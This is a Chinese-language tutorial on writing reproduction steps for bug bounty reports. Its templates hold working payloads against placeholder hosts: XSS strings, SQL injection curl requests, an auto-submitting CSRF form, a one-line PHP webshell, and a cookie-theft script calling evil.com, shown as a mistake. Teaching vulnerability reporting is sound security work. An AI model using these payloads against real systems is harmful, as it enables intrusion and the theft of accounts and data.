## 概述

复现步骤是 Bug Bounty 漏洞报告中**最关键的单一要素**。它直接决定了厂商安全团队能否在合理时间内确认漏洞的真实性。一份写得好的复现步骤，能让安全工程师在 5 分钟内复现并确认漏洞；一份写得差的复现步骤，即使漏洞本身价值连城，也可能被标记为"信息不足"而直接关闭。

> **核心原则**：复现步骤的目标不是"证明你发现了漏洞"，而是"让接收方能在最短时间内独立复现、确认并修复它"。

---

## 一、复现步骤的核心价值与定位

### 1.1 为什么复现步骤如此重要

在 Bug Bounty 生态中，复现步骤承担着三重角色：

| 角色 | 说明 | 失败后果 |
|------|------|----------|
| **真实性验证** | 厂商必须独立复现才能确认漏洞存在 | 被标记为"无法复现"，报告关闭 |
| **严重程度评估** | 复现难度直接影响 CVSS 评分中的"攻击复杂度"维度 | 评级被低估，奖金缩水 |
| **修复指引** | 复现步骤反向映射到代码位置，是修复的起点 | 修复周期延长，漏洞持续暴露 |

**数据支撑**：根据 HackerOne 2023 年报告质量分析，复现步骤质量与报告通过率呈强正相关——复现步骤清晰完整的报告，首次审核通过率高达 92%，而步骤模糊的报告通过率仅为 31%。

### 1.2 复现步骤在报告中的位置

复现步骤位于报告的"操作层"，承接"漏洞详情"（是什么）和"影响分析"（为什么重要），是连接理论与实操的桥梁：

```text
漏洞详情（What）→ 复现步骤（How）→ 影响分析（Why）→ 修复建议（Fix）
```

## 二、复现步骤的四大构成要素

一份合格的复现步骤必须包含以下四个要素，缺一不可：

```text
┌────────────────────────────────────────────────────────┐
│                   复现步骤四要素                          │
├────────────────────────────────────────────────────────┤
│                                                        │
│  1. 前置条件（Prerequisites）                            │
│     需要什么账号/权限/环境/工具/特定状态                    │
│                                                        │
│  2. 操作步骤（Steps to Reproduce）                       │
│     每一步做什么，精确到点击哪个按钮、输入什么内容           │
│                                                        │
│  3. 预期现象（Expected Behavior）                        │
│     每一步应该看到什么反馈（正常行为）                      │
│                                                        │
│  4. 实际现象（Actual Behavior）                          │
│     实际看到了什么，哪些现象表明存在安全漏洞                │
│                                                        │
└────────────────────────────────────────────────────────┘
```

### 2.1 前置条件：降低复现门槛

前置条件的核心目标是**让厂商安全工程师以最低成本进入测试状态**。常见的遗漏包括：

- **账号凭据**：不提供可登录的测试账号，厂商需要自己注册
- **权限要求**：不说清楚需要管理员权限还是普通用户权限
- **环境依赖**：不说清楚需要特定浏览器、特定设备（移动端/桌面端）
- **时序依赖**：不说清楚需要等待多长时间、需要触发多少次

**前置条件模板：**

```text
前置条件：
- 测试账号：test@example.com / Test123!（已在目标系统注册）
- 浏览器：Chrome 120+ 或 Firefox 121+
- 权限要求：普通注册用户即可（无需管理员权限）
- 网络环境：无需特殊配置，正常互联网访问即可
- 注意事项：测试账号的"个人简介"字段需为空（如已有内容，请先清空）
```

### 2.2 操作步骤：精确到原子级别

操作步骤是复现步骤的主体。每一条步骤应该是**原子操作**——即不可再拆分的单一动作。

**原子步骤的标准格式：**

```text
步骤 N：[操作描述]
  - 位置：[在哪里操作]
  - 输入：[输入什么内容]
  - 输出：[预期看到什么]
```

**优秀示例：**

```javascript
步骤 1：登录测试账号
  - 打开浏览器，访问 https://example.com/login
  - 输入用户名：test@example.com，密码：Test123!
  - 点击"登录"按钮
  - 预期：跳转到首页 https://example.com/dashboard，右上角显示用户名

步骤 2：进入个人资料编辑页面
  - 点击右上角头像 → 选择"编辑资料"
  - 预期：跳转到 https://example.com/profile/edit

步骤 3：注入恶意 payload
  - 在"个人简介"输入框中粘贴以下 payload：
    <img src=x onerror="alert(document.domain)">
  - 点击页面底部的"保存"按钮
  - 预期：页面提示"保存成功"并返回个人资料页

步骤 4：验证漏洞触发
  - 刷新个人资料页面（或退出登录后重新登录）
  - 预期：页面正常显示个人简介内容
  - 实际：弹出 JavaScript 弹窗，显示当前域名
  - 结论：存储型 XSS 漏洞确认
```

### 2.3 预期 vs 实际：明确漏洞边界

区分"预期行为"和"实际行为"是复现步骤中最容易被忽视但最有价值的部分。它帮助厂商理解：

1. 漏洞的触发边界在哪里
2. 正常行为是什么（便于对比）
3. 漏洞的具体表现是什么

```text
步骤 5：验证存储型 XSS 的持久性
  - 使用另一个测试账号（victim@example.com）登录
  - 访问攻击者个人资料页面：https://example.com/users/attacker
  - 预期：看到攻击者的个人简介内容
  - 实际：同样弹出 JavaScript 弹窗
  - 结论：payload 已被存储到数据库，对所有访问该页面的用户生效
```

### 2.4 多角色场景处理

当漏洞需要多个用户角色配合时（如 IDOR、CSRF、存储型 XSS 的跨用户影响），必须明确标注角色切换：

```text
步骤 1~3（攻击者 A）：[操作描述]
步骤 4~5（受害者 B）：[操作描述]
步骤 6~7（管理员 C）：[操作描述]
```

## 三、按漏洞类型的复现步骤模板

不同漏洞类型有不同的复现模式。以下提供常见漏洞类型的标准化模板。

### 3.1 存储型 XSS（Stored XSS）

```javascript
前置条件：
- 注册用户账号：attacker@example.com / Test123!
- 浏览器：Chrome/Firefox，无需插件

复现步骤：
1. 使用 attacker 账号登录 https://example.com/login
2. 进入个人资料页面：右上角头像 → "编辑资料"
3. 在"个人简介"字段输入：
   <img src=x onerror="alert(document.domain)">
4. 点击"保存"按钮，确认保存成功
5. 退出登录，使用 victim@example.com 账号登录
6. 访问 https://example.com/users/attacker
7. 观察：页面弹出 JavaScript 弹窗，显示当前域名

预期行为：个人简介内容应被 HTML 转义后以纯文本显示
实际行为：JavaScript 代码被执行，弹窗出现
漏洞类型：存储型 XSS（CWE-79）
```

### 3.2 反射型 XSS（Reflected XSS）

```javascript
前置条件：
- 无需登录
- 浏览器：Chrome/Firefox

复现步骤：
1. 访问以下 URL：
   https://example.com/search?q=<script>alert(document.domain)</script>
2. 观察页面响应

预期行为：搜索关键词应被 HTML 转义后显示
实际行为：JavaScript 弹窗出现
漏洞类型：反射型 XSS（CWE-79）
```

### 3.3 SQL 注入（SQL Injection）

```text
前置条件：
- 无需登录
- 工具：curl 或浏览器

复现步骤：
1. 正常请求（基线）：
   curl "https://example.com/api/v2/search?keyword=test"
   预期：返回包含"test"的搜索结果

2. 注入 payload（布尔盲注）：
   curl "https://example.com/api/v2/search?keyword=test' AND '1'='1"
   预期：返回与正常请求相同的结果（条件为真）

3. 注入 payload（布尔盲注 - 假条件）：
   curl "https://example.com/api/v2/search?keyword=test' AND '1'='2"
   预期：返回与正常请求相同的结果
   实际：返回空结果或错误信息（条件为假，行为不同）

4. 注入 payload（时间盲注）：
   curl "https://example.com/api/v2/search?keyword=test' OR SLEEP(5)-- "
   预期：响应时间在 1-2 秒内
   实际：响应时间约 5-6 秒

预期行为：输入应被参数化查询处理，不产生 SQL 语法影响
实际行为：SQL 注入 payload 成功改变查询逻辑
漏洞类型：SQL 注入（CWE-89）
```

### 3.4 IDOR（不安全的直接对象引用）

```text
前置条件：
- 两个测试账号：user_a@example.com 和 user_b@example.com
- 两个账号均已完成注册

复现步骤：
1. 使用 user_a 登录，获取其 Session Cookie
2. 使用 user_a 访问自己的订单列表：
   GET https://example.com/api/v1/orders
   记录返回的订单 ID，例如：order_id=12345
3. 将 URL 中的 order_id 改为 user_b 的订单 ID：
   GET https://example.com/api/v1/orders/67890
   （其中 67890 是 user_b 的订单 ID，通过其他途径获取）
4. 观察响应

预期行为：应返回 403 Forbidden 或"无权访问此资源"
实际行为：返回了 user_b 的完整订单信息（包含姓名、地址、支付信息）
漏洞类型：IDOR / 水平越权（CWE-639）
```

### 3.5 CSRF（跨站请求伪造）

```javascript
前置条件：
- 已登录用户账号
- 攻击者控制的页面（可使用 Pastebin 或自有域名）

复现步骤：
1. 受害者使用自己的账号登录 https://example.com
2. 攻击者诱导受害者访问恶意页面：
   https://attacker.com/csrf.html
   页面内容：
   <form action="https://example.com/api/v1/users/change-email" method="POST">
     <input type="hidden" name="email" value="attacker@evil.com">
     <input type="submit" value="点击领取奖励">
   </form>
   <script>document.forms[0].submit();</script>
3. 受害者点击页面后，浏览器自动发送 POST 请求到目标站点
4. 受害者返回目标站点，检查邮箱设置

预期行为：邮箱修改请求应包含有效的 CSRF Token，无 Token 的请求应被拒绝
实际行为：邮箱被成功修改为 attacker@evil.com
漏洞类型：CSRF（CWE-352）
```

### 3.6 SSRF（服务器端请求伪造）

```text
前置条件：
- 注册用户账号
- Burp Collaborator 客户端或自有 DNS 日志服务

复现步骤：
1. 使用测试账号登录 https://example.com
2. 进入"导入数据"功能页面
3. 在"导入 URL"字段输入：
   https://your-collaborator-id.burpcollaborator.net
4. 点击"导入"按钮
5. 打开 Burp Collaborator 客户端，查看交互记录

预期行为：服务器不应向外部域名发起请求
实际行为：Collaborator 记录了来自目标服务器 IP 的 DNS/HTTP 请求
漏洞类型：SSRF（CWE-918）
```

### 3.7 文件上传漏洞

```text
前置条件：
- 注册用户账号
- 准备恶意文件：webshell.php（内容为 <?php system($_GET['cmd']); ?>）

复现步骤：
1. 登录目标系统
2. 进入"头像上传"功能
3. 选择准备好的 webshell.php 文件
4. 上传后记录返回的文件路径，例如：
   https://example.com/uploads/avatars/webshell.php
5. 访问该路径并传入参数：
   https://example.com/uploads/avatars/webshell.php?cmd=id
6. 观察响应

预期行为：文件应被重命名为随机名称，或扩展名被修改为 .jpg/.png
实际行为：返回系统命令执行结果（如 uid=33(www-data) gid=33(www-data)）
漏洞类型：任意文件上传（CWE-434）
```

## 四、高级复现技巧

### 4.1 链式漏洞的复现

当漏洞需要多个步骤组合才能触发完整影响时（如 XSS → CSRF → 提权），复现步骤需要更精细的结构：

```text
## 攻击链概述

本漏洞由三个子漏洞组合而成：
  子漏洞 A：存储型 XSS（CWE-79）
  子漏洞 B：CSRF 缺乏保护（CWE-352）
  子漏洞 C：权限提升逻辑缺陷（CWE-269）

## 完整复现步骤

阶段一：植入 XSS payload（攻击者 A）
  步骤 1~3：[具体操作]

阶段二：触发 CSRF 攻击（受害者 B）
  步骤 4~6：[具体操作]

阶段三：权限提升（攻击者 A 利用 XSS + CSRF）
  步骤 7~9：[具体操作]

最终结果：攻击者 A 成功将受害者 B 的账户提升为管理员权限
```

**链式漏洞复现的关键原则：**

| 原则 | 说明 |
|------|------|
| **分层标注** | 用"阶段"划分不同攻击阶段，用"步骤"标注每个原子操作 |
| **角色切换** | 明确标注每一步由哪个角色执行 |
| **时序说明** | 如果存在时间窗口（如 Token 有效期），必须标注 |
| **依赖关系** | 说明阶段二依赖阶段一的结果，阶段三依赖阶段二的状态 |

### 4.2 竞态条件（Race Condition）

竞态条件漏洞的复现具有不确定性，需要特殊处理：

```text
前置条件：
- 注册用户账号，余额为 $100
- 工具：Burp Suite Intruder 或 Python 脚本

复现步骤：
1. 在 Burp Suite 中捕获转账请求：
   POST /api/v1/transfer
   {"to": "victim@example.com", "amount": 50}

2. 将请求发送到 Intruder，配置如下：
   - 攻击类型：Cluster Bomb
   - 线程数：20
   - 请求数：每线程 10 次
   - 目标参数：amount（固定为 50）

3. 启动攻击，同时发送 200 个转账请求

4. 等待所有请求完成后，检查账户余额

预期行为：账户余额应减少 $50（只扣一次）
实际行为：账户余额减少 $10,000（200 × $50，每次请求都扣款）
成功率：约 70%（竞态条件具有概率性，需多次尝试）

注意：由于竞态条件的概率性特征，建议在报告中提供多次运行的统计数据
```

### 4.3 时间敏感型漏洞

某些漏洞只在特定时间窗口内有效（如验证码过期、Token 刷新）：

```text
前置条件：
- 注册用户账号
- 准备两个浏览器窗口（Window A 和 Window B）

复现步骤：
1. 在 Window A 中打开 https://example.com/reset-password
2. 输入注册邮箱，点击"发送验证码"
3. 在 Window B 中打开 Burp Suite Repeater
4. 在 Window A 中获取验证码后，立即在 Burp 中构造请求：
   POST /api/v1/reset-password/verify
   {"email": "test@example.com", "code": "123456", "new_password": "Hacked123!"}
5. 在验证码过期前（60 秒内）发送请求

预期行为：验证码应在 60 秒后失效，过期请求应被拒绝
实际行为：过期验证码仍然可以成功重置密码
漏洞类型：验证码时效性校验缺失
```

### 4.4 移动端特定漏洞

移动端漏洞需要额外说明设备信息和操作路径：

```text
前置条件：
- 设备：iOS 17.0 / iPhone 15 Pro
- App 版本：v3.2.1（从 App Store 下载）
- 账号：已注册的测试账号

复现步骤：
1. 打开 App，使用测试账号登录
2. 进入"我的" → "修改手机号"
3. 输入新手机号：13800138000
4. 点击"获取验证码"
5. 在收到验证码之前，使用 Burp Suite 拦截验证码提交请求
6. 修改验证码为任意 6 位数字（如 000000）
7. 放行请求

预期行为：验证码应被服务端校验，错误验证码应返回失败
实际行为：手机号被成功修改
漏洞类型：验证码校验逻辑缺陷（仅校验格式不校验内容）
```

## 五、证据材料规范

复现步骤需要配合高质量的证据材料，形成完整的证据链。

### 5.1 截图规范

| 要素 | 要求 | 原因 |
|------|------|------|
| 分辨率 | 1280×720 以上 | 看不清等于没有 |
| 标注 | 红色箭头/方框标出关键位置 | 引导视线至漏洞点 |
| URL 栏 | 必须包含浏览器地址栏 | 证明操作在目标系统上 |
| 隐私处理 | 打码或替换测试数据 | 避免泄露真实用户信息 |
| 编号 | 每张截图标注编号（图 1、图 2...） | 与步骤编号对应 |

**推荐截图工具链：**

```text
截图编辑：Flameshot（Linux）/ Snipaste（Windows）/ Shottr（Mac）
GIF 录制：Peek（Linux）/ ScreenToGif（Windows）/ GIPHY Capture（Mac）
视频录制：OBS Studio（全平台）+ FFmpeg 压缩
```

### 5.2 请求/响应证据

对于 HTTP 层面的漏洞，提供完整的请求和响应报文是最有说服力的证据：

```bash
## 请求报文（Burp Suite → Repeater → Copy as curl）

curl -X POST "https://example.com/api/v1/users/profile" \
  -H "Content-Type: application/json" \
  -H "Authorization: Bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..." \
  -d '{"name":"<script>alert(document.domain)</script>","bio":"test"}'

## 响应报文

HTTP/1.1 200 OK
Content-Type: application/json
Set-Cookie: session=abc123; Path=/; HttpOnly

{"status":"success","data":{"name":"<script>alert(document.domain)</script>","bio":"test"}}
```

### 5.3 HAR 文件

对于复杂的交互流程（如 SPA 应用中的多步操作），提供 HAR（HTTP Archive）文件是最完整的证据形式：

```text
HAR 文件制作步骤：
1. Chrome → F12 开发者工具 → Network 标签页
2. 勾选"Preserve log"（保留日志）
3. 执行完整的漏洞复现流程
4. 右键任意请求 → "Save all as HAR with content"
5. 将 HAR 文件作为附件上传到报告中
```

### 5.4 视频证据

对于需要展示完整攻击链的漏洞，视频是最直观的证据：

```text
视频录制规范：
- 时长：控制在 3 分钟以内（厂商审核耐心有限）
- 分辨率：1080p
- 帧率：30fps
- 内容：从打开浏览器到漏洞触发，完整展示每一步
- 旁白：可选，但建议用文字标注关键步骤
- 格式：MP4（兼容性最好）
```

## 六、常见错误与纠正方法

### 6.1 步骤跳跃

**错误示例：**
```text
1. 登录
2. 发现 XSS
```

**问题分析：** 从"登录"直接跳到"发现 XSS"，中间缺少了"在哪里输入 payload"、"输入什么 payload"、"如何触发"等关键步骤。

**纠正方法：** 每一步都是原子操作，不省略任何中间环节。

### 6.2 依赖未说明

**错误示例：**
```text
1. 访问 https://example.com/admin
2. 点击"删除用户"按钮
3. 发现 IDOR 漏洞
```

**问题分析：** 没有说明如何获得管理员权限、需要哪些前置操作才能进入 admin 页面。

**纠正方法：** 在"前置条件"中明确说明权限要求和获取方式。

### 6.3 Payload 不可执行

**错误示例：**
```javascript
在搜索框输入：<script>fetch('https://evil.com?c='+document.cookie)</script>
```

**问题分析：** 依赖外部域名 evil.com，厂商可能无法访问或被防火墙拦截。

**纠正方法：** 优先使用不依赖外部服务的 payload，如 `alert(document.domain)`。

### 6.4 缺少预期与实际对比

**错误示例：**
```text
步骤 3：输入 payload 后点击保存
结果：XSS 触发
```

**问题分析：** 只说了实际结果，没说预期结果，厂商无法理解漏洞的严重性。

**纠正方法：** 始终提供"预期行为"和"实际行为"的对比。

### 6.5 环境信息缺失

**错误示例：**
```text
1. 打开 App，点击"支付"
2. 发现可以支付负数金额
```

**问题分析：** 没有说明 App 版本、操作系统、账号状态等环境信息。

**纠正方法：** 在"前置条件"中完整列出环境要求。

## 八、平台差异与适配

不同 Bug Bounty 平台对复现步骤的格式和详细程度有不同的偏好：

| 平台 | 复现步骤偏好 | 特殊要求 |
|------|-------------|----------|
| **HackerOne** | 分步骤编号，简洁清晰 | 支持嵌入视频/截图，鼓励提供 curl 命令 |
| **Bugcrowd** | 严格的必填字段，格式规范 | 要求"Steps to Reproduce"和"Proof of Concept"分开填写 |
| **Intigriti** | 自由格式，但要求截图 | 支持多语言，复现步骤可用中文 |
| **YesWeHack** | 自由格式 | 要求提供可独立运行的 POC 代码 |
| **内部渗透测试** | 最详细，包含完整攻击链 | 需要包含时间线、影响范围、修复建议 |

## 九、总结

复现步骤是 Bug Bounty 报告中**投入产出比最高**的部分。花 30 分钟打磨一份清晰的复现步骤，可能直接决定报告的通过与否和奖金的高低。

**核心要点回顾：**

1. **四要素缺一不可**：前置条件、操作步骤、预期行为、实际行为
2. **原子步骤原则**：每一步都是不可再拆分的单一动作
3. **预期 vs 实际**：明确区分正常行为和漏洞行为
4. **证据链完整**：截图、请求报文、HAR 文件、视频互为补充
5. **平台适配**：根据目标平台调整格式和详细程度
6. **自检清单**：提交前逐项检查，确保无遗漏

> **最后一句话**：好的复现步骤让厂商安全工程师在 5 分钟内复现漏洞；差的复现步骤让厂商在 5 天后仍然无法复现。你写的不是步骤，是漏洞的"使用说明书"。
